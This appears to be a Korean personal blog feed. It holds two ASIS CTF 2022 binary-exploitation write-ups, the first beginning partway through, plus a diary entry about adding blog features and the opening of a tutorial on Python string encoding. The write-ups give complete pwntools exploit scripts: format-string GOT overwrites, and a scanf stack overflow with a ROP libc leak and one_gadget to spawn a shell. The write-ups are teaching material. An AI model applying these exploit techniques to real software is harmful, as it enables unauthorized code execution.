class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> fmt[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%15s&quot;</span>, nptr);</span><br><span class="line">  <span class="keyword">if</span> ( ((*__ctype_b_loc())[nptr[<span class="number">0</span>]] &amp; <span class="number">0x800</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = atoi(nptr);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="number">8uLL</span>, <span class="string">&quot;%%%ss&quot;</span>, nptr);</span><br><span class="line">  __isoc99_scanf(fmt, v6);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>우리는 현재 특정 함수의 got를 덮을 수 있는데, <code>atoi</code> 함수가 정말정말 너무너무 이것저것하기에 적당해 보인다. (인자를 하나만 받아서..)</p><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>처음에 leak할 때 <code>atoi@got</code>를 <code>puts</code>로 덮어서 릭하려고 했었다. 매우매우매우매우매우 바보같은 생각이었다. leak하고 싶은 주소를 넣어주면 고대로 출력해준다. (…)</p><p>leak할 때도 fsb를 이용해야 한다. 그래서 <code>atoi@got</code>을 <code>printf</code>로 덮고, <code>ntpr</code>에 포맷스트링을 넣어줘야 한다.</p><h3 id="isdigit-bypass"><a href="#isdigit-bypass" class="headerlink" title="isdigit() bypass"></a><code>isdigit()</code> bypass</h3><p>prototype은 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isdigit</span><span class="params">( <span class="type">int</span> arg )</span>;</span><br></pre></td></tr></table></figure><p>parameter로는 <code>char</code>가 들어가야 한다. ‘0’ ~ ‘9’ 의 값만 들어갈 수 있는데, 이 문제에서서는 15글자를 인자로 줄 수 있다.<br>따라서 <code>0&lt;입력&gt;</code> 이런식으로 첫 글자에 숫자 하나를 주고 뒤에 원하는 문자들을 써서 이 검사를 우회할 수 있다.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><code>exit@got</code>를 <code>main</code> 주소로 덮어 무한히 실행되게 하기</li><li><code>atoi@got</code>를 <code>printf</code> 주소로 덮어 leak할 수 있게 구성하기</li><li><code>0%29$p</code>를 보내서 <code>__libc_start_main - 243</code> leak</li><li><code>system</code> 실제 주소를 구한 후 <code>atoi@got</code>을 덮기</li><li>마지막으로 <code>0;sh</code>를 보내 shell 획득</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pchall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">33710</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pchall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit@got -&gt; main</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;exit&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(e.symbols[&#x27;main&#x27;])</span></span><br><span class="line">payload = p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># atoi@got -&gt; puts</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(e.symbols[<span class="string">&#x27;printf&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">payload = <span class="string">b&#x27;0%29$p&#x27;</span><span class="comment">#b&#x27;9$&#x27;.ljust(8, b&#x27;\x00&#x27;) + p64(e.got[&#x27;atoi&#x27;])[:-1]</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;00x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">243</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># atoi@got -&gt; system</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">&#x27;0;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="data-보낼-때-0-7-로-자른-이유"><a href="#data-보낼-때-0-7-로-자른-이유" class="headerlink" title="data 보낼 때 [0:7]로 자른 이유?"></a><code>data</code> 보낼 때 <code>[0:7]</code>로 자른 이유?</h3><p><code>scanf</code> 함수는 입력할 때 마지막에 Null byte를 삽입한다.<br><code>p64()</code>로 패킹해서 보내게 되면 8바이트를 전송하게 된다. 이때 <code>scanf</code>로 입력을 받았기 때문에 마지막에 Null byte가 추가되어 <code>_ctype_b_loc@got.plt</code>를 더럽혀버렸다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/2gx 0x0000000000404058</span><br><span class="line">0x404058 &lt;exit@got.plt&gt;:0x00000000004012560x00007fba7666d400</span><br><span class="line">gef&gt; x/gx 0x0000000000404058 + 0x8</span><br><span class="line">0x404060 &lt;__ctype_b_loc@got.plt&gt;:0x00007fba7666d400</span><br><span class="line">gef&gt; x/gx 0x00007fba7666d400</span><br><span class="line">0x7fba7666d400 &lt;isspace_l+16&gt;:0x66c3c0b70f200025</span><br></pre></td></tr></table></figure><p>아래가 올바른 경우이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/2gx 0x0000000000404058</span><br><span class="line">0x404058 &lt;exit@got.plt&gt;:0x00000000004012560x00007fdc030534a0</span><br><span class="line">gef&gt; x/gx 0x0000000000404058 + 0x8</span><br><span class="line">0x404060 &lt;__ctype_b_loc@got.plt&gt;:0x00007fdc030534a0</span><br><span class="line">gef&gt; x/gx 0x00007fdc030534a0</span><br><span class="line">0x7fdc030534a0 &lt;__ctype_b_loc&gt;:0x5d058b48fa1e0ff3</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;fd408e00d5824d7220c4d624f894144e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ASIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> scanf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2022 - baby scan 1</title>
      <link href="/221017-asisctf2022-babysacn_1/"/>
      <url>/221017-asisctf2022-babysacn_1/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(87&#x2F;532) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Is it possible to scan the thousands of resulting strings by hand? We think it’s tedious, but will get the job done!</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   └── chall</span><br><span class="line">├── lib</span><br><span class="line">│   ├── ld-2.31.so</span><br><span class="line">│   └── libc.so.6</span><br><span class="line">├── run.sh</span><br><span class="line">└── src</span><br><span class="line">    └── main.c</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)alloca(atoi(size) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloca</code> 함수는 스택에 메모리를 할당하는 함수이다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>포맷스트링 인자를 마음대로 줄 수 있으니 입력으로 0을 넣으면 stack overflow를 트리거할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%0s&quot;</span>, buf);</span><br></pre></td></tr></table></figure><p>same as</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><code>%0s</code> 포맷스트링으로 overflow 트리거</li><li>원가젯</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">13370</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401433</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0xe3b01</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Another-Solve"><a href="#Another-Solve" class="headerlink" title="Another Solve"></a>Another Solve</h2><h3 id="1-Using-FSB"><a href="#1-Using-FSB" class="headerlink" title="1. Using FSB"></a>1. Using FSB</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1$999&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe3b4d0ac8 → 0x73393939243125 (&quot;%1$999s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe3b4d0ab0 → 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe3b4d0ab0 → 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Maybe.. I think this solution is intention.</p><h3 id="2-Using-rsi-x3D-x3D-rdx"><a href="#2-Using-rsi-x3D-x3D-rdx" class="headerlink" title="2. Using rsi &#x3D;&#x3D; rdx"></a>2. Using rsi &#x3D;&#x3D; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1s%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> </span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe99d75878 → 0x00007325733125 (&quot;%1s%s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe99d75860 → 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe99d75860 → 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;06e5ff13b438f5d6626a97758fddde3e502fe3fc&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ASIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-14 Diary</title>
      <link href="/221014-diary/"/>
      <url>/221014-diary/</url>
      
        <content type="html"><![CDATA[<h2 id="블로그-관련"><a href="#블로그-관련" class="headerlink" title="블로그 관련"></a>블로그 관련</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>댓글 기능을 추가했다. </p><p>전에 잠깐 운영했던 블로그는 utterances을 사용했었다. Github의 issue로 댓글을 관리할 수 있다는 점이 매력적이었지만 Github 계정이 있어야만 댓글을 등록할 수 있다는 점이 마음에 들지 않았다. 그래도 마크다운도 지원하고 나름 ui도 예뻐서 계속 사용하고 싶었으나 내가 원하는 기능이 구현되어 있지 않았다. 바로 reaction 기능인데, tistory에 하트로 공감 누르는.. 그런 기능을 원했지만 utterances에는 그런 기능이 없었다. hexo plugin을 찾아봤지만 찾아보기가 힘들었다. 그러다가 giscus라는 것을 발견했다.</p><p>giscus는 utterances와 매우 유사하다. utterances에서 대댓글 기능을 추가했다. 또한 내가 원하는 reaction 기능이 있었다! 그래서 바로 giscus를 적용하려고 했으나 익명인 상태에선 댓글과 reaction을 할 수 없다는 것이 은근 거슬렸다. </p><p>그래서 결국 disqus를 이용하기로 했다. 광고가 붙는다는 사실때문에 사용하기 꺼려졌었는데, 잠깐 서치해본 결과 광고는 일일 조회수에 영향을 받는 것 같았다. 정확한 수치는 기억이 나지 않지만 이정도면 광고 붙을 걱정을 하지 않아도 될 것 같다고 판단했다. ㅋㅋ </p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>Search 탭을 추가했다. 정적으로 탐색해서 속도가 짱짱 빠르다. 매우 마음에 든다. 내가 자주 쓸 것 같다.</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>Sitemap 등록을 했다. 전에 잠깐 운영했던 블로그에도 Sitemap 등록을 했었는데 그 흔적이 아직 남아있다 T.T 삭제하고 재등록을 했음에도.. 흑흑<br>색인이 제대로 생성되지 않아 유효성 검사를 요청했다. 오래 걸릴 수도 있다고 한다. </p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Deal With Strings in Python</title>
      <link href="/221013-python3-String/"/>
      <url>/221013-python3-String/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Python에서서의 문자열 인코딩 방식을 설명하기 위해 <code>ASCII</code>와 <code>Unicode</code>에 대해 간단히 설명한다. Python2에서는 디폴트 인코딩 방식이 <code>ASCII</code>이지만 Python3에서는 <code>UTF-8</code>을 채택했다. <code>UTF-8</code>은 <code>Unicode</code> 인코딩 방식 중 하나로 전세계에서 널리 쓰이는 인코딩 방식이다.</p><p>Python2와 Python3에서 문자열을 다루는 방식이 바뀌었으므로, payload를 작성할 때 Python2에 익숙한 player가 Python3를 사용하기 위해서는 Unicode로 인코딩한 byte 문자열과 일반 문자열의 차이를 알고 있어야 한다.</p><h2 id="ASCII와-Unicode"><a href="#ASCII와-Unicode" class="headerlink" title="ASCII와 Unicode"></a>ASCII와 Unicode</h2><p><code>ASCII</code>와 <code>Unicode</code>에 대해 간단히 알아보자.</p><h3 id="아스키-ASCII-American-Standard-Code-for-Information-Interchange"><a href="#아스키-ASCII-American-Standard-Code-for-Information-Interchange" class="headerlink" title="아스키 (ASCII, American Standard Code for Information Interchange)"></a>아스키 (ASCII, American Standard Code for Information Interchange)</h3><ul><li>1960년대 미국에서 정의한 표준화한 부호체계</li></ul><p><code>ASCII 코드</code>는 7bit 즉, 128(&#x3D;2^7)개의 고유한 값만 사용한다. 컴퓨터의 기본 저장 단위는 1byte(&#x3D;8bits)인데, <code>ASCII 코드</code>는 7bit만 사용한다. 나머지 1bit는 Parity Bit인데, 이는 통신 에러 검출을 의미한다.</p><p>10진수로 0부터 127, 16진수로 0x00부터 0x7F의 범위로 문자열 Char 즉, 고유값을 표현할 수 있다.</p><p>7bit로 표현할 수 있는 <code>ASCII 코드</code>는 ‘영문’만을 표현할 수 있다. 다른 언어를 표현하기에는 7bit로는 역부족이었다. 그래서 8bits로 확장한 아스키 코드가 등장했는데, 이를 <code>ANSI 코드</code>라고 부르기로 했다더라.</p><p><code>ANSI 코드</code>는 8bits로 표현할 수 있으니 256(&#x3D;2^8)개의 값을 쓸 수 있는데, 여전히 ‘한글’을 포함한 비유럽 국가의 문자를 표현하기에는 역부족이었다. 그래서 <code>유니코드 (Unicode)</code>라는 전 세계 언어의 문자를 정의하기 위한 국제 표준 코드가 등장했다.</p><h3 id="유니코드-Unicode"><a href="#유니코드-Unicode" class="headerlink" title="유니코드 (Unicode)"></a>유니코드 (Unicode)</h3><p><code>유니코드</code>는 <code>ASCII 코드</code>나 <code>ANSI 코드</code>보다 훨씬 크게 용량을 2byte(&#x3D;2^16, 65536)로 확장한 코드이다. 무려 65536(&#x3D;2^16)개나 문자를 저장할 수 있었다. 참고로 <code>유니코드 3.0버전</code>까지는 이를 <code>기본 언어판 (BMP, Basic Multilingual Plane)</code>이라고 불렀다. 비트맵이 아니다.</p><p>0x0000부터 0xFFFF까지 표현이 가능하다.</p><p>하지만 이는 또 세상의 모든 언어를 감당하기가 힘들었다. 그래서 <code>유니코드 3.0버전</code>부터 <code>보충 언어판 (Supplementary Plane)</code>을 정의했다. 이때 한자가 가장 많이 할당받았다고 한다. 그런데 이것은 bit로 어떻게 표현할 수 있을까?</p><p>사실 <code>기본 언어판</code>에는 대행코드 